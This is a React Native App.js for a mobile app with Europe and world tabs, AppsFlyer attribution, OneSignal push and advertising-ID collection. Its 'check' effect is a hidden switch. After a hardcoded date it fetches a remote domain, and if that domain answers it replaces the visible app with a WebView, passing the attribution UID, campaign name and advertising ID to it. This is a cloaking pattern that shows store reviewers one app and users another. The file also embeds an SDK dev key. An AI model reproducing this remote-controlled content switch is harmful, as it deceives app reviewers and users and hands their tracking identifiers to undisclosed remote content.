import 'react-native-gesture-handler';
import React,{useState, useEffect, useRef} from "react";
import {Animated, StyleSheet, View, Text } from "react-native";


import { NavigationContainer } from '@react-navigation/native';
import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';
import { createStackNavigator } from '@react-navigation/stack';

import Europe from "./routs/Europe";
import OtherWorld from "./routs/OtherWorld";
import MyProfile from "./routs/MyProfile";
import WebViewScreen from "./routs/WebView";

import FontAwesome from 'react-native-vector-icons/FontAwesome';
import Fontisto from 'react-native-vector-icons/Fontisto';
import AntDesign from 'react-native-vector-icons/AntDesign';

import { LogLevel, OneSignal } from 'react-native-onesignal';
import ReactNativeIdfaAaid, { AdvertisingInfoResponse } from '@sparkfabrik/react-native-idfa-aaid';
import appsFlyer from 'react-native-appsflyer';
import AsyncStorage from '@react-native-async-storage/async-storage';

const Stack = createStackNavigator();
const Tab = createBottomTabNavigator();


const App = () => {
  const [turn, setTurn] = useState('permition');

  const [uid, setUid] = useState(null);
  const [naming, setNaming] = useState(null);
  const [idfa, setIdfa] = useState(null);
  ///////////////////////////////////////
  const [rout, setRout] = useState(null);
  console.log('rout', rout)
  //const routnig = useRoute(rout);
  



  useEffect(() => {
    getData()
  }, []);

  useEffect(() => {
    setData();
  }, [naming, uid, idfa]);
  
  useEffect(() => {
    if (idfa) {
     // Метод для запиту дозволів на push-сповіщення
     OneSignal.Notifications.requestPermission(true).then((res) => {
       console.log('res==>', res[0]);
       //if (res[0] === true) {
         console.log('УРА!!!');
          setTurn('loader')
       //}
     });
    }
  }, [idfa]);
//
  // Функція для збереження даних у AsyncStorage
  const setData = async () => {
    try {
      const data = {
        naming,
        uid,
        idfa
      }
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem("namingData", jsonData);
      console.log('Дані збережено in App.js AsyncStorage');
    } catch (e) {
      console.log('App.js Помилка збереження даних 190:', e);
    }
  };

  // Функція для доставання даних у AsyncStorage
  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('namingData');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        console.log('parsedData in App.js==>', parsedData);
        setNaming(parsedData.naming);
        setUid(parsedData.uid);
        setIdfa(parsedData.idfa);
        setTurn('loader');
        console.log('дані завантажені in App.ja з AsyncStorage');
      } else {
        
        performAppsFlyerOperations()
        performIdfaOperations();

        performOneSignalOperations()
        
        
        // Метод для запиту дозволів на push-сповіщення
        //OneSignal.Notifications.requestPermission(true);
        
         
      }
            
    } catch (e) {
      console.log('App.js Помилка отримання даних 217:', e);
    }
  };

  
  const performAppsFlyerOperations = () => {

    //3
    function getAppsFlyerNaming() {
      return new Promise((resolve, reject) => {
        const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
          res => {
            if (JSON.parse(res.data.is_first_launch) === true) {
              if (res.data.af_status === 'Non-organic') {

                console.log('App.js res.data==>', res.data);
                const { campaign, af_adset, af_ad, af_os } = res.data;
                
                const naming = `${campaign}_${af_adset}_${af_ad}`;

                resolve(naming);
              } else if (res.data.af_status === 'Organic') {
                const naming = `${res.data.af_status}`;
                resolve(naming);
              }
              
              
            }
            
          }
        );
      });
    };
    getAppsFlyerNaming().then(naming => {
      console.log('App.js naming==>', naming)
      if (naming) {
        setNaming(naming);
      }
      

    }).catch(error => {
      console.error('App.js Помилка отримання інформації про атрибуцію:', error);
    });

    //1ST FUNCTION
    function InitAppsflyer() {
      return new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: 'USAoqsTaaR8fEMYskDi3w',
            appId: '6472645168',
            isDebug: true,
            onInstallConversionDataListener: true, //Optional
            onDeepLinkListener: true, //Optional
            timeToWaitForATTUserAuthorization: 10, //for iOS 14.5
          },
          resolve,
          reject,
        );
      });
    };
    // Ініціалізація AppsFlyer
    InitAppsflyer()
      .then(() => {
        console.log('App.js AppsFlyer ініціалізовано успішно');
        // Тут ви можете виконувати інші дії після ініціалізації AppsFlyer
      })
      .catch(error => {
        console.error('App.js Помилка ініціалізації AppsFlyer:', error);
      });
    
    //2 FUNCTION
    function GetUIDAppsflyer() {
      return new Promise((resolve, reject) => {
        appsFlyer.getAppsFlyerUID((err, appsFlyerUID) => {
          if (err) {
            reject(err);
          } else {
            // console.log('on getAppsFlyerUID: ' + appsFlyerUID);

            resolve(appsFlyerUID);
          }
        });
      });
    };
    // Отримання UID AppsFlyer
    GetUIDAppsflyer()
      .then(uid => {
        console.log('App.js UID AppsFlyer:', uid);
        // Тут ви можете виконувати інші дії з отриманим UID
        setUid(uid)
      })
      .catch(error => {
        console.error('App.js Помилка отримання UID AppsFlyer:', error);
      });
    
  };
 
   const performOneSignalOperations = () => {
    // Метод для запиту дозволів на push-сповіщення
    //OneSignal.Notifications.requestPermission(true).then((res) => {
    //  console.log('res==>', res[0]);
    //  if (res[0] === true) {
    //    console.log('УРА!!!');
    //     setTurn('loader')
    //  }
    //});
    console.log('App.js performOneSignalOperations')
    // Remove this method to stop OneSignal Debugging
    OneSignal.Debug.setLogLevel(LogLevel.Verbose);

    // OneSignal Initialization
    OneSignal.initialize("e59d3bf9-2fca-48f8-ba4a-3aebf04f8777");

    // Method for listening for notification clicks
    OneSignal.Notifications.addEventListener('click', (event) => {
      console.log('OneSignal: notification clicked:', event);
    });

    //Add Data Tags
    OneSignal.User.addTag("key", "value");

   };
  
  const performIdfaOperations = () => {
    
    ReactNativeIdfaAaid.getAdvertisingInfo()
      .then((res) =>
        !res.isAdTrackingLimited ? setIdfa(res.id) : setIdfa(true),
      ).catch((err) => {
        console.log('App.js idfa помилка', err);
        return setIdfa(null);
      });
  };
  //
  
  ////////////////// лоудер
  //const [loaderIsLoaded, setLoaderIsLoaded] = useState(false);
  const ChangeInView = props => {
    // const fadeAnim = useRef(new Animated.Image(require('../../acets/loader1.jpg'))).current;
    
    const firstAnimImg = useRef(new Animated.Value(1)).current; // Initial value for opacity: 0 to 1
    useEffect(() => {
      Animated.timing(firstAnimImg, {
        toValue: 0,
        duration: 4500,
        useNativeDriver: true,
      }).start();
    }, []);

    const secondAnimImg = useRef(new Animated.Value(0)).current;// Initial value for opacity: 1 to 0
    useEffect(() => {
      Animated.timing(secondAnimImg, {
        toValue: 1,
        duration: 4500,
        useNativeDriver: true,
      }).start();
    }, []);

    const firdAnimImg = useRef(new Animated.Value(0)).current; // Initial value for opacity: 0 to 1
    useEffect(() => {
      setTimeout(() => {
        Animated.timing(firdAnimImg, {
          toValue: 1,
          duration: 4500,
          useNativeDriver: true,
        }).start();
      }, 3500);

      setTimeout(() => {
        setTurn('app')
      }, 9500);
      
    }, []);

    return (
      <View style={{ position: 'relative', flex: 1 }}>
        <Animated.Image
          source={require('./accets/loader/loader_1.png')}// Special animatable View
          style={{
            ...props.style,
            opacity: firstAnimImg,
            //width: 'auto',
            height: '100%'  // Bind opacity to animated value
          }} />
        <Animated.Image
          source={require('./accets/loader/loader_2.png')}// Special animatable View
          style={{
            ...props.style,
            opacity: secondAnimImg,
            //width: '100%',
            height: '100%',
            position: 'absolute'// Bind opacity to animated value
          }} />
        <Animated.Image
          source={require('./accets/loader/loader_3.png')}// Special animatable View
          style={{
            ...props.style,
            opacity: firdAnimImg,
            //width: '100%',
            height: '100%',
            position: 'absolute'// Bind opacity to animated value
          }} />
      </View>
    
    );
  };

  /////////////check
  useEffect(() => {
    //const checkUrl = 'https://reactnative.dev/docs/animated';
    const checkUrl = 'https://jewelllbell.space/s8m2gj5z';
    const targetData = new Date('2023-12-14');//дата з якої поч працювати webView 
    const currentData = new Date();//текущая дата 

    targetData.setHours(12, 0, 0, 0);

    if (currentData <= targetData) {
      setRout(false)
    } else (

      fetch(checkUrl).then(r => {
        if (r.status === 200) {
          setRout(true)
          //setIsLoading(false)
        } else {
          setRout(false)
          //setIsLoading(false)
        }
      }).catch(err => {
        console.log('error', err)
        setRout(false)

      })
      
      
    );
    
  });

///////////////// app
  const Route = ({ isFatch }) => {
    
    if (isFatch) {
      return (
        <Stack.Navigator >
          <Stack.Screen
            options={{ headerShown: false }}
            name="WebViewScreen"
            component={WebViewScreen} initialParams={{ appsFlyerUID: uid, appsFlyerNaming: naming, advertasingId: idfa }} />
        </Stack.Navigator>
      )
    } return (
      <Tab.Navigator initialRouteName='Europe' screenOptions={{
        tabBarShowLabel: true,
        headerShown: false,
      }}>
      
        <Tab.Screen name="My Profile" component={MyProfile} options={{
          tabBarActiveBackgroundColor: '#36212c',
          tabBarInactiveBackgroundColor: '#8c1633',
          tabBarLabelStyle: { color: '#fff' },
          tabBarIcon: ({ focused }) => {
            return (
              <AntDesign name='profile' style={{ color: focused ? '#fff' : '#fff', fontSize: 25 }} />
            )
          }
        }} />
        
        <Tab.Screen name="Europe" component={Europe} options={{
          tabBarActiveBackgroundColor: '#36212c',
          tabBarInactiveBackgroundColor: '#8c1633',
          tabBarLabelStyle: { color: '#fff' },
          tabBarIcon: ({ focused }) => {
            return (
              <FontAwesome name='euro' style={{ color: focused ? '#fff' : '#fff', fontSize: 25 }} />
            )
          }
        }} />
        <Tab.Screen name="Other World" component={OtherWorld} options={{
          tabBarActiveBackgroundColor: '#36212c',
          tabBarInactiveBackgroundColor: '#8c1633',
          tabBarLabelStyle: { color: '#fff' },
          tabBarIcon: ({ focused }) => {
            return (
              <Fontisto name='world' style={{ color: focused ? '#fff' : '#fff', fontSize: 25 }} />
            )
          }
        }} />
      
      
      </Tab.Navigator>
    )
    
  };

  return (
    <NavigationContainer>

      {turn === 'permition' && <View style={{flex: 1, alignItems: 'center', justifyContent: 'center'}}>
        <Text></Text>
      </View>}
      
      {turn === 'loader' && <ChangeInView
          style={{
            width: '100%',
            //height: 50,
            backgroundColor: 'powderblue',
          }}>
      </ChangeInView>}
      
      {turn === 'app' && <Route isFatch={rout } />}
      
    </NavigationContainer>
  );
};


export default App;

const styles = StyleSheet.create({
  conteiner: {
    flex: 1,
    backgroundColor: "#fff",
    alignItems: "center",
    justifyContent: "center"
  },

})

